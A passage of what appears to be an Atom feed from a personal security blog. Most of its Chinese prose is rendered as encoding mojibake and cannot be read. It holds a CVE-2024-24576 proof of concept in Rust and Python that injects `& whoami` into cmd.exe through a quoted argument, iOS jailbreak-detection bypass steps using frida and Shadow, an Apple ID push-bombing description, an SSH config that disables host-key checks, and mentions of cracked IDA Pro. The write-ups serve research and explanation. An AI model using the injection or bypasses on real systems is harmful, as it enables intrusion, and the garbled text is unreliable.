<p><u>Chromeä½¿ç”¨Minizipåº“æ¥è§£å‹ç¼©CRXï¼ˆå®é™…ä¸Šæ˜¯ZIPæ ¼å¼ï¼‰ï¼Œå¯»æ‰¾EOCDæ—¶ï¼Œå‡½æ•°ä¼šä»æ–‡ä»¶æœ«å°¾å‘å‰æŸ¥æ‰¾<strong>64kB</strong>ï¼ŒMinizipä¼šå…ˆå°è¯•æŸ¥æ‰¾EOCD64ï¼Œå†æŸ¥æ‰¾EOCDï¼ˆ32ï¼‰ï¼Œè¿™å°±ä¸ºæ³¨å…¥å¸¦æ¥äº†å¯èƒ½</u></p>
<p>ä½†è¿™ä¹Ÿä½¿å¾—è¯¥æ–¹æ³•åªèƒ½å¤„ç†64kBå¤§å°ä»¥ä¸‹ï¼ˆEOCDï¼‰çš„æ‰©å±•ç¨‹åºï¼Œä½†æ’ä»¶åº”ç”¨å¸‚åœºä¸­æœ€å°çš„æ˜¯73kBã€‚ã€‚ã€‚ã€‚</p>
<p>Googleå…è®¸å…¬å¸è‡ªè¡Œå®šä¹‰ä¼ä¸šçº§æ’ä»¶ï¼Œè¿™äº›æ’ä»¶å¯ä»¥ä»å…¬å¸å†…éƒ¨æœåŠ¡å™¨è‡ªåŠ¨å®‰è£…å’Œæ›´æ–°ã€‚åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œå¯èƒ½è¿˜å­˜åœ¨64kBä»¥ä¸‹çš„æ‰©å±•ç¨‹åºğŸ˜‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Rust\Pythonç­‰ç¼–ç¨‹è¯­è¨€å¯¹Winä¸‹CMDè¿›è¡Œè¶Šæƒ]]></title>
        <id>https://AegeanYan.github.io/post/rustpython-deng-bian-cheng-yu-yan-dui-win-xia-cmd-jin-xing-yue-quan/</id>
        <link href="https://AegeanYan.github.io/post/rustpython-deng-bian-cheng-yu-yan-dui-win-xia-cmd-jin-xing-yue-quan/">
        </link>
        <updated>2024-05-07T14:55:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2024-24576-windows-rust">CVE-2024-24576 Windows Rust</h1>
<blockquote>
<p>The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the <code>bat</code> and <code>cmd</code> extensions) on Windows using the <a href="https://doc.rust-lang.org/std/process/struct.Command.html"><code>Command</code></a> API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.</p>
</blockquote>
<p>Rust ç¼–ç¨‹è¯­è¨€èƒŒåçš„é¡¹ç›®å£°ç§°ï¼Œå¯¹ç‰¹å®š API çš„ä»»ä½•è°ƒç”¨éƒ½æ˜¯å®‰å…¨çš„ï¼Œå³ä½¿è¾“å…¥çš„æ˜¯ä¸å®‰å…¨çš„å†…å®¹ï¼Œä½†ç ”ç©¶äººå‘˜æ‰¾åˆ°äº†ç»•è¿‡ä¿æŠ¤çš„æ–¹æ³•ã€‚åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åœ¨windows cmdä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚</p>
<p>**å—å½±å“çš„ Rust ç‰ˆæœ¬ï¼š**Rust for Windows &lt; 1.77.2</p>
<p>**CVSSç­‰çº§ï¼š**10.0</p>
<p><strong>æ¼æ´å½±å“é¢ï¼š</strong></p>
<p>è¿™ä¸ªæ¼æ´åªå­˜åœ¨äº Windows ç³»ç»Ÿï¼Œä½†ä¸ä»…ä»…å½±å“ Rust è¯­è¨€ï¼Œåƒ PHPã€Pythonã€Node.js ç­‰å‡å—å½±å“ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå¦‚ä¸‹é¡µé¢ï¼š</p>
<ol>
<li>CERT/CC: <a href="https://www.kb.cert.org/vuls/id/123335">Multiple programming languages fail to escape arguments properly in Microsoft Windows</a></li>
<li>Flatt Security Inc./RyotaK: <a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/">BatBadBut: You canâ€™t securely execute commands on Windows</a></li>
</ol>
<h4 id="poc">PoC</h4>
<h6 id="testbat">test.bat</h6>
<pre><code class="language-bat">@echo off
echo Argument received: %1
</code></pre>
<h6 id="testrs">test.rs</h6>
<pre><code class="language-rust">use std::io::{self, Write};
use std::process::Command;

fn main() {
    println!(&quot;enter payload here&quot;);
    let mut input = String::new();
    io::stdout().flush().expect(&quot;Failed to flush stdout&quot;);
    io::stdin().read_line(&amp;mut input).expect(&quot;Failed to read from stdin&quot;);
    let output = Command::new(&quot;./test.bat&quot;)
                    .arg(input.trim())
                    .output()
                    .expect(&quot;Failed to execute command&quot;);
    println!(&quot;Output:\n{}&quot;, String::from_utf8_lossy(&amp;output.stdout));
}
</code></pre>
<h6 id="æµ‹è¯•">æµ‹è¯•</h6>
<pre><code>D:\&gt;rustc test.rs

D:\&gt;test.exe
enter payload here
aaa
Output:
Argument received: aaa

D:\&gt;test.exe
enter payload here
aaa &amp; whoami
Output:
Argument received: &quot;aaa &amp; whoami&quot;

D:\&gt;test.exe
enter payload here
aaa&quot; &amp; whoami
Output:
Argument received: &quot;aaa\&quot;
desktop-618ia48\ddw
</code></pre>
<h6 id="é”™è¯¯é€»è¾‘ä¸ä¿®å¤">é”™è¯¯é€»è¾‘ä¸ä¿®å¤</h6>
<p>æ¼æ´ç‰ˆæœ¬ä¼šæŠŠæ ·ä¾‹åŒ…è£…æˆ<code>cmd.exe /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa\&quot; &amp; whoami&quot;&quot;</code></p>
<p>ä¿®å¤ç‰ˆæœ¬ä¼šæŠŠæ ·ä¾‹åŒ…è£…æˆ<code>cmd.exe /e:ON /v:OFF /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa&quot;&quot; &amp; whoami&quot;&quot;</code></p>
<h6 id="pythonæ ·ä¾‹">Pythonæ ·ä¾‹</h6>
<pre><code>D:\&gt;python3
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; subprocess.Popen(['test.bat', 'aaa&quot; &amp; whoami'])
&lt;Popen: returncode: None args: ['test.bat', 'aaa&quot; &amp; whoami']&gt;
&gt;&gt;&gt; Argument received: &quot;aaa\&quot;
desktop-618ia48\ddw
</code></pre>
<h5 id="æ€»ç»“">æ€»ç»“</h5>
<p>åœ¨Windowsä¸‹ä»¥Rustã€PythonåŠä¸€äº›è¯­è¨€è°ƒç”¨cmdæ—¶ï¼Œè¿è¡Œ.bat, .cmdç­‰éƒ½ä¼šå› ä¸ºè½¬ä¹‰é€»è¾‘å‡ºé”™è€Œäº§ç”Ÿé¢„æ–™å¤–è¡Œä¸ºã€‚è¯¥æ¼æ´è·Ÿå†…å­˜å®‰å…¨æ²¡æœ‰å…³ç³»ï¼Œæ˜¯ Windows ä¸‹ <code>cmd.exe</code> å¯¹å‘½ä»¤è¡Œå‚æ•°çš„ç‰¹æ®Šè§£æé€»è¾‘æ‰€å¯¼è‡´çš„é€»è¾‘æ¼æ´ã€‚</p>
<h5 id="å‚è€ƒæ–‡æ¡£">å‚è€ƒæ–‡æ¡£</h5>
<ol>
<li>https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/</li>
<li>https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html</li>
<li>https://www.kb.cert.org/vuls/id/123335</li>
<li>https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main</li>
<li>https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</li>
<li>https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</li>
<li>https://persistence-info.github.io/Data/cmdautorun.html</li>
<li>https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[è®°å½•å‡ ç§è¶Šç‹±æ£€æµ‹ç»•è¿‡]]></title>
        <id>https://AegeanYan.github.io/post/ji-lu-ji-chong-yue-yu-jian-ce-rao-guo/</id>
        <link href="https://AegeanYan.github.io/post/ji-lu-ji-chong-yue-yu-jian-ce-rao-guo/">
        </link>
        <updated>2024-04-09T12:20:28.000Z</updated>
        <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©éœ€è¦hookå‡ æ¬¾appï¼Œå‡ ä¹æ¯æ¬¾éƒ½æœ‰è¶Šç‹±æ£€æµ‹ï¼Œæ•…è®°å½•ä¸€ä¸‹å‡ ç§å·²ç»ä½¿ç”¨è¿‡çš„ç»•è¿‡æ–¹æ³•ã€‚</p>
<ul>
<li>ä¿®æ”¹frida-serveräºŒè¿›åˆ¶æ–‡ä»¶åï¼Œç»•è¿‡ç®€å•çš„æ–‡ä»¶åæ£€æµ‹ã€‚çˆ±æ€åŠ©æ‰‹æˆ–è€…mvå‡å¯</li>
<li>ä¿®æ”¹fridaç›‘å¬ç«¯å£ï¼Œé»˜è®¤æ£€æµ‹27042ã€‚
<ul>
<li>./frida -l 0.0.0.0:41032</li>
<li>iproxy 41032 41032</li>
<li>objection -N -h <strong>localhost</strong> -p 3333 -g <code>bundle_id</code> explore è¿™é‡Œçš„localhostæ¢æˆ127.0.0.1æˆ–0.0.0.0éƒ½ä¼šæ— æ³•è¿æ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</li>
</ul>
</li>
<li>æ·»åŠ Shadowçš„Cydiaæºï¼Œå¹¶å®‰è£…Shadowï¼Œè¿è¡ŒShadowæ¥é®è”½è¶Šç‹±ã€‚Shadowå¼€å¯åŠ¨æ€åº“ä¼šä½¿objectionæ— æ³•è¿æ¥</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Apple IDç½‘ç»œé’“é±¼æ”»å‡»â€”â€”é€šè¿‡é‡è®¾å¯†ç è¯·æ±‚]]></title>
        <id>https://AegeanYan.github.io/post/apple-id-wang-luo-diao-yu-gong-ji-tong-guo-chong-she-mi-ma-qing-qiu/</id>
        <link href="https://AegeanYan.github.io/post/apple-id-wang-luo-diao-yu-gong-ji-tong-guo-chong-she-mi-ma-qing-qiu/">
        </link>
        <updated>2024-04-07T16:06:55.000Z</updated>
        <content type="html"><![CDATA[<p>2024å¹´3æœˆ24æ—¥ï¼ŒXç”¨æˆ·æ±‡æŠ¥å—åˆ°äº†æ–°å‹çš„ç½‘ç»œé’“é±¼æ”»å‡»ï¼Œä¸»è¦åŸå› æ¥è‡ªäºAppleå¯¹äº<a href="https://iforgot.apple.com/">é‡è®¾å¯†ç </a>è¯·æ±‚çš„ä½é™åˆ¶ã€‚</p>
<p><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack.jpeg" style="zoom:10%;" /><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack_1.jpeg" style="zoom:10%;" /></p>
<p>æ”»å‡»è€…åªéœ€è¦å—å®³è€…çš„Apple IDå’Œç”µè¯å·ç å°±å¯ä»¥å‘å‡ºæ•°ä»¥ç™¾è®¡çš„Resetè¯·æ±‚åˆ°å—å®³è€…çš„æ‰€æœ‰appleè®¾å¤‡ï¼Œå¿…é¡»å…¨éƒ¨ç‚¹å‡»åæ‰èƒ½æ­£å¸¸ä½¿ç”¨è®¾å¤‡ï¼Œè¯¥æ”»å‡»ä¼šå½±å“ç”¨æˆ·æ­£å¸¸ä½¿ç”¨ï¼ˆæ¯”å¦‚å¤œé—´è¿›è¡Œå¤§æ‰¹é‡çš„è¯·æ±‚ï¼‰ï¼Œä¸ªäººæµ‹è¯•åªéœ€è¦å…¨éƒ¨ç‚¹å‡»Don't Allowï¼Œåœ¨ä¸€æ®µæ—¶é—´å†…å°±ä¸ä¼šæ”¶åˆ°æ–°çš„è¯·æ±‚ã€‚</p>
<p>æ­¤å¤–æ”»å‡»è€…è¿˜ä¼šå‡æ‰®Appleå…¬å¸çš„å®¢æœå·ç 1-800-275-2273ï¼Œå‘Šè¯‰å—å®³è€…å…¶è´¦å·æ­£å—åˆ°æ”»å‡»ï¼Œéœ€è¦æä¾›OTPã€‚è€ŒOTPå¾ˆå¯èƒ½è¢«æ”»å‡»è€…ç”¨äºé‡è®¾Apple IDã€‚OTPä¿®æ”¹å¯†ç å¹¶ä¸ä¼šå¿«é€Ÿå®Œæˆï¼ŒAppleä¼šå¯¹å—å®³è€…è¿›è¡Œæé†’å¹¶å®¡æ ¸çº¦ä¸€å‘¨ã€‚æ‰€ä»¥æˆ‘è§‰å¾—å®é™…èƒ½é’“åˆ°é±¼çš„éš¾åº¦å¾ˆå¤§ã€‚</p>
<p><a href="https://twitter.com/parth220_/status/1771589789143478471?s=61">å‚è€ƒ1</a></p>
<p><a href="https://www.macworld.com/article/2280669/apple-id-push-bombing-attack-reset-password-notification.html?utm_source=danielmiessler.com&amp;utm_medium=referral&amp;utm_campaign=ul-no-426-unveiling-xz-ai-monitoring-investigative-visualizations-with-fabric">å‚è€ƒ2</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[iDeviceçš„usbè¿æ¥]]></title>
        <id>https://AegeanYan.github.io/post/idevice-de-usb-lian-jie/</id>
        <link href="https://AegeanYan.github.io/post/idevice-de-usb-lian-jie/">
        </link>
        <updated>2024-04-05T11:16:00.000Z</updated>
        <summary type="html"><![CDATA[<p>ç®€å•ä»‹ç»ä¸€ä¸‹å¦‚ä½•ç”¨USBè¿æ¥å–ä»£ç®€å•çš„ç½‘ç»œè¿æ¥</p>
]]></summary>
        <content type="html"><![CDATA[<p>ç®€å•ä»‹ç»ä¸€ä¸‹å¦‚ä½•ç”¨USBè¿æ¥å–ä»£ç®€å•çš„ç½‘ç»œè¿æ¥</p>
<!-- more -->
<p>ä¸€èˆ¬æˆ‘ä»¬sshè¿æ¥iDeviceçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯<code>ssh root@ip</code>ï¼Œä½†çœ‹åˆ°æœ‰äººå»ºè®®ä½¿ç”¨usbè¿æ¥ã€‚åœ¨macä¸Šæˆ‘ä½¿ç”¨<code>usbmuxd</code>æ¥å®Œæˆ<a href="https://iphonedev.wiki/SSH_Over_USB">å‚è€ƒ</a>ã€‚</p>
<pre><code>brewâ€ƒinstallâ€ƒlibusbmuxd
</code></pre>
<p>ä½¿ç”¨brewä¸‹è½½<code>libusbmuxd</code></p>
<p>å†å°†</p>
<pre><code>Host my-iphone
    ProxyCommand inetcat 22 &lt;my-phone-uuid&gt;
    User root
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
</code></pre>
<p>å†™å…¥<code>~/.ssh/config</code>æ–‡ä»¶ï¼Œå°±å¯ä»¥ç®€å•çš„<code>ssh my-iphone</code>è¿›è¡Œsshè¿æ¥å•¦ã€‚</p>
<p>å…¶æ¬¡ï¼Œ<code>usbmuxd</code> ä¸­è¿˜æœ‰<code>iproxy</code>å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰“é€šä¸»æœºå’Œusbè®¾å¤‡ç«¯å£ã€‚</p>
<p>æ¯”å¦‚åœ¨IDA pro debuggerä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨å‘½ä»¤<code>debugserver ä¸»æœºhost:port0 --attach=&lt;process_name&gt;</code> å’Œ IDAä¸­ <code>iDevicehost:port0</code> æ¥è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚è€Œåˆ©ç”¨<code>iproxy</code>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç«¯å£æ˜ å°„æ¥æ‰“é€šè®¾å¤‡ã€‚</p>
<p>å…ˆåœ¨ä¸»æœºä¸Šè¿è¡Œè¿›ç¨‹</p>
<pre><code>iproxy port1 port2
</code></pre>
<p>ä¹‹åiDeviceä¸Šçš„debugserverå‘½ä»¤å¯ä»¥æ˜¯<code>debugserver localhost:port1 --attach=&lt;process_name&gt;</code> , IDAè®¾ç½®ä¸º<code>localhost:port2</code>ç”±æ­¤æ¥è¿›è¡ŒUSBè¿æ¥ï¼Œæå‡ç½‘ç»œæ€§èƒ½ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[IDA pro debuggeråˆå°é¿å‘æŒ‡å—]]></title>
        <id>https://AegeanYan.github.io/post/ida-pro-debugger-chu-chang-bi-keng-zhi-nan/</id>
        <link href="https://AegeanYan.github.io/post/ida-pro-debugger-chu-chang-bi-keng-zhi-nan/">
        </link>
        <updated>2024-04-05T10:45:33.000Z</updated>
        <summary type="html"><![CDATA[<p>èŒæ–°æƒ³è¦è°ƒè¯•è‡ªå·±æ‰‹ä¸Šçš„ä¸€ä¸ªç®€å•é¡¹ç›®ï¼Œä½†åœ¨ä½¿ç”¨è‡ªå·±çš„IDA pro 7.0 cracked ç‰ˆæœ¬ æŒ‰æ•™ç¨‹å¯åŠ¨debuggeræ—¶å‡ºç°äº† <code>Invalid service</code> çš„é—®é¢˜ï¼Œæœ€åˆæˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±çš„IDA proç‰ˆæœ¬è¿‡ä½çš„é—®é¢˜ã€‚ä»Hex-rays<a href="https://hex-rays.com//wp-content/uploads/2020/06/ios_debugger_primer2.pdf">å®˜æ–¹æ•™ç¨‹</a>ä¸­å‘ç°è‡ªå·±çš„ <code>Device</code>æ æ²¡æœ‰è‡ªåŠ¨è¯†åˆ«ã€‚äºæ˜¯å»PYGæ‰¾åˆ°äº†8.3ç‰ˆæœ¬çš„windowç‰ˆIDA proå¹¶ç”¨crossoverä¸è‡ªå·±çš„intel macæ‰“é€šdebuggeræˆåŠŸã€‚å‘ç°ç½‘ç»œä¸Šçš„æ•™ç¨‹æˆ–å¤ªè€æˆ–ä¸å…¨ï¼Œè€ƒè™‘åˆ°è‡ªå·±çš„æ¢ç´¢å¯èƒ½æ˜¯äº’è”ç½‘ä¸Šå¤´ä¸€ä»½ï¼Œæ•…è®°å½•ä¸€ä¸‹ã€‚</p>
]]></summary>
        <content type="html"><![CDATA[<p>èŒæ–°æƒ³è¦è°ƒè¯•è‡ªå·±æ‰‹ä¸Šçš„ä¸€ä¸ªç®€å•é¡¹ç›®ï¼Œä½†åœ¨ä½¿ç”¨è‡ªå·±çš„IDA pro 7.0 cracked ç‰ˆæœ¬ æŒ‰æ•™ç¨‹å¯åŠ¨debuggeræ—¶å‡ºç°äº† <code>Invalid service</code> çš„é—®é¢˜ï¼Œæœ€åˆæˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±çš„IDA proç‰ˆæœ¬è¿‡ä½çš„é—®é¢˜ã€‚ä»Hex-rays<a href="https://hex-rays.com//wp-content/uploads/2020/06/ios_debugger_primer2.pdf">å®˜æ–¹æ•™ç¨‹</a>ä¸­å‘ç°è‡ªå·±çš„ <code>Device</code>æ æ²¡æœ‰è‡ªåŠ¨è¯†åˆ«ã€‚äºæ˜¯å»PYGæ‰¾åˆ°äº†8.3ç‰ˆæœ¬çš„windowç‰ˆIDA proå¹¶ç”¨crossoverä¸è‡ªå·±çš„intel macæ‰“é€šdebuggeræˆåŠŸã€‚å‘ç°ç½‘ç»œä¸Šçš„æ•™ç¨‹æˆ–å¤ªè€æˆ–ä¸å…¨ï¼Œè€ƒè™‘åˆ°è‡ªå·±çš„æ¢ç´¢å¯èƒ½æ˜¯äº’è”ç½‘ä¸Šå¤´ä¸€ä»½ï¼Œæ•…è®°å½•ä¸€ä¸‹ã€‚</p>
<!-- more -->
<p>é¦–å…ˆå·²ç»éªŒè¯çš„æ˜¯æŠ¥é”™<code>Error launching iOS debugserver: The service is invalid. (errcode = 0xe8000022)</code>å’ŒIDA proç‰ˆæœ¬æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œå’Œwin/macçš„IDA proç‰ˆæœ¬å­˜åœ¨ä¸€å®šå…³ç³»ã€‚åœ¨IDA proä»»åŠ¡æ  debugger-&gt;Debugger options-&gt;Set specific optionsä¸­å¯ä»¥é€‰æ‹©<code>Lauch debugserver automatically</code>é¡¹ï¼Œæ¨æµ‹è¿™æ˜¯IDAåˆ©ç”¨Xcodeåšçš„è‡ªåŠ¨è¯†åˆ«ä¸å¯åŠ¨iDeviceä¸Šçš„debugserverï¼ˆwindowsç‰ˆæœ¬æ˜¯æ²¡æœ‰è¿™é¡¹çš„ï¼‰ã€‚ç„¶è€Œè¿™é‡Œå­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼šHex-rayså®˜æ–¹æ•™ç¨‹é‡Œä½¿ç”¨çš„æ˜¯æœªè¶Šç‹±ç‰ˆæœ¬çš„iDeviceï¼Œä¸”iOS_deploy.zipè¿™ä¸ªå·¥å…·å·²éš¾æ‰¾åˆ°ç»¿è‰²èµ„æºï¼ˆç—›å¤±ä¸€å—å¤§æ´‹ä»æ—®æ—¯é‡Œä¹°äº†ä¸€ä»½ï¼‰ã€‚æœªè¶Šç‹±ç‰ˆæœ¬çš„debugserveræœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>Xcodeè‡ªåŠ¨å®‰è£…çš„debugserverä¸ºåªè¯»ï¼Œåœ¨è¶Šç‹±ç‰ˆä¸­å¯ä»¥é‡ç­¾åæ”¾å›ï¼ˆå·²å°è¯•<a href="https://book.crifan.org/books/ios_re_debug_debugserver_lldb/website/debugserver_lldb_debug/proper_entitlemets.html">debugserver codesign</a>ï¼‰ï¼Œï¼ˆè¿™é‡Œé¢æˆ‘é‡åˆ°ä¸ªå‘ï¼Œä¸ºåäººé¿é›·äº†ï¼šXcodeè‡ªåŠ¨å®‰è£…debugserveræ—¶è™½ç„¶æˆ‘çš„Xcodeç‰ˆæœ¬è¶³å¤Ÿæ–°ï¼Œæœ‰DeviceSupport/&lt;version&gt;/DeveloperDiskImage.dmg èµ„æºï¼Œä½†Xcodeäºä»»åŠ¡æ Windows-&gt;Devices and Simulatorsé¦–æ¬¡è¿æ¥è®¾å¤‡æ—¶æŠ¥é”™Failed to prepare the device for developmentï¼Œä¸”debugserveræœªå®‰è£…æˆåŠŸï¼Œè€Œæˆ‘è‡ªå·±çš„æœªè¶Šç‹±æ‰‹æœºè¿æ¥æ­£å¸¸ï¼Œ<a href="https://stackoverflow.com/q/64974291">stackoverflow</a>ä¸Šæåˆ°ä¸€å˜´JBçš„é—®é¢˜ç»™äº†æˆ‘æ€è·¯ï¼Œæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯é‡å¯éå®Œç¾è¶Šç‹±çš„è®¾å¤‡å›åˆ°JailedçŠ¶æ€å³å¯æ­£å¸¸è¿æ¥Xcodeï¼Œåç»­å³ä½¿å†æ¬¡è¶Šç‹±ä¹Ÿèƒ½æ­£å¸¸è¿æ¥äº†ï¼Œè™½ç„¶JBç‰ˆæœ¬çš„debugserverå®Œå…¨æ²¡å¿…è¦ä»è¿™é‡Œå®‰è£…ï¼Œä½†ä¸çŸ¥é“Xcodeè¿™é‡Œçš„æŠ¥é”™ä¼šä¸ä¼šå¸¦æ¥åç»­å½±å“ï¼‰</li>
<li>åœ¨æˆ‘çš„è¶Šç‹±ç‰ˆæœ¬ä¸­å¯ä»¥ç›´æ¥åœ¨Cydiaä¸­ä¸‹è½½å®‰è£…debugserver-10æ¥å®Œç¾æ›¿ä»£ã€‚åŠŸèƒ½åº”è¯¥æ²¡æœ‰åŒºåˆ«ï¼Œå¹¶ä¸”æ— è®ºå“ªç§debugserverï¼Œæœ€åæˆ‘åœ¨ä½¿ç”¨<code>Lauch debugserver automatically</code> éƒ½å¤±è´¥äº†ï¼Œä½†æ‰‹åŠ¨å¯åŠ¨å´éƒ½èƒ½æˆåŠŸdebugã€‚</li>
</ul>
<p>æ€»è€Œè¨€ä¹‹è¿™ä¸ªé”™è¯¯çš„æ¥æºæ˜¯macç‰ˆçš„IDA proä¸Šæ‰æœ‰çš„<code>Lauch debugserver automatically</code>é¡¹ï¼Œå°†å…¶å…³é—­åæ‰‹åŠ¨é…ç½®host:portï¼Œå¹¶æ‰‹åŠ¨å¯åŠ¨ä»»ä½•ä¸€ç§debugserverå³èƒ½æ­£å¸¸è¿è¡Œã€‚</p>
<p>å…¶æ¬¡åˆ†äº«ä¸€ä¸‹è‡ªå·±åˆ©ç”¨Crossoveræ‰“é€šwinç‰ˆIDA pro debuggerçš„ç»éªŒã€‚ç”±äºè‡ªå·±æœ€æ—©çš„æ€€ç–‘æ˜¯IDA proç‰ˆæœ¬é—®é¢˜ï¼Œä»P.Y.Gæåˆ°äº†å‡ ä¹æ˜¯æœ€æ–°ç‰ˆçš„IDA pro 8.3ï¼Œä½†æ˜¯å¥½åƒåªæœ‰winç‰ˆï¼Œå—ç¤¾åŒºå¯å‘åˆ©ç”¨Crossoverè¯•è¯•ã€‚Crossoverèµ„æºè‡ªè¡Œå¯»æ‰¾ã€‚Crossoverå®é™…åšäº†ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬çš„winè™šæ‹Ÿæœºï¼Œç®€å•è®²ä¸€ä¸‹å®‰è£…ä¸Šçš„ä¸€ç‚¹é—®é¢˜ï¼Œå‚è€ƒ<a href="https://bbs.kanxue.com/thread-278679.htm">é£˜é›ª</a>ã€‚æˆ‘ä»¬ä¿æŒPythonç‰ˆæœ¬å’ŒP.Y.Gçš„å®‰è£…åŒ…ä¸€è‡´ï¼Œä¸ä¸‹è½½embededç‰ˆæœ¬ï¼ˆå› ä¸ºéœ€è¦Script/pipæ¥è¿›è¡ŒåŒ…ç®¡ç†å’Œä¸‹è½½ï¼‰ï¼Œè€Œæ˜¯åˆ©ç”¨è¿è¡Œå‘½ä»¤<code>cmd</code>æ¥ç”¨exeå®‰è£…Pythonï¼Œè®¾ç½®ä¸­å°†è·¯å¾„æ”¾åˆ°äº†IDA proæ–‡ä»¶å¤¹é‡Œã€‚è¿™é‡Œè¯´å‡ ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ul>
<li>å®‰è£…ç›®å½•éšæ„ï¼Œå‡ºé”™ç‚¹è·³è¿‡è¿™ä¸€æ­¥å°±è¡Œ</li>
<li>è¿è¡Œå‘½ä»¤<code>regedit</code>æ‰“å¼€æ³¨å†Œè¡¨ï¼Œï¼ˆçŒœæµ‹è¿™ä¸ªå’ŒWin+Ræ•ˆæœä¸€æ ·çš„ï¼‰å¡«å†™ç¯å¢ƒå˜é‡HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environmentä¸­çš„PATHé¡¹ï¼ŒåŒæ—¶æ”¾å…¥pythonæ–‡ä»¶å¤¹è·¯å¾„å’Œ&lt;python&gt;/Scriptè·¯å¾„ï¼Œæ¥ä¿è¯pythonå’Œpipéƒ½å¯¹æ•´ä½“ç¯å¢ƒå¯è§</li>
<li>åœ¨æ³¨å†Œè¡¨ä¸­ç»§ç»­å¡«å†™HKEY_USERS\S-1-5-21-0-0-0-1000\Software\Hex-Rays\IDA\Python3TargetDLLï¼Œè‹¥æœªè§Python3TargetDLLé¡¹åˆ™æ–°å¢ å­—ç¬¦ä¸²å€¼ , åå­—æ˜¯ Python3TargetDLL, å€¼æ˜¯ idaç›®å½•ä¸‹ python3.dll çš„ç›®å½•</li>
<li>æ³¨æ„æˆ‘ä»¬åœ¨å®é™…åœ¨æ“ä½œwinè™šæ‹Ÿæœºï¼Œå„ç§è·¯å¾„éœ€è¦ä»winçš„è§’åº¦æ¥çœ‹ï¼ˆåˆ†ç›˜ã€åæ–œæ ï¼‰</li>
<li>è¿è¡Œå‘½ä»¤<code>cmd</code>,å®‰è£…pythonåˆ°è‡ªå®šä¹‰è·¯å¾„ï¼ŒæŒ‰ç…§è¯´æ˜å‡çº§pipã€å®‰è£…keystone-engineå’Œsix</li>
<li>åœ¨debuggerä¸­å¡«å†™å„ç§å¿…è¦é¡¹ï¼Œæ³¨æ„åæ–œæ å’Œåˆ†ç›˜ï¼ˆiosè®¾å¤‡è·¯å¾„ç”¨æ­£æ–œæ ï¼‰ï¼Œå¡«å†™host:portå¹¶æ‰‹åŠ¨å¯åŠ¨debugserverå³å¯æˆåŠŸã€‚</li>
</ul>
<p>å…³äºF5æŠ¥é”™ï¼šå®‰è£…<a href="https://www.chinapyg.com/forum.php?mod=viewthread&amp;tid=149566&amp;highlight=IDA%2Bpro%2B8.3">è¯¥é“¾æ¥</a>è¦†ç›–æ–‡ä»¶å³å¯</p>
]]></content>
    </entry>
</feed>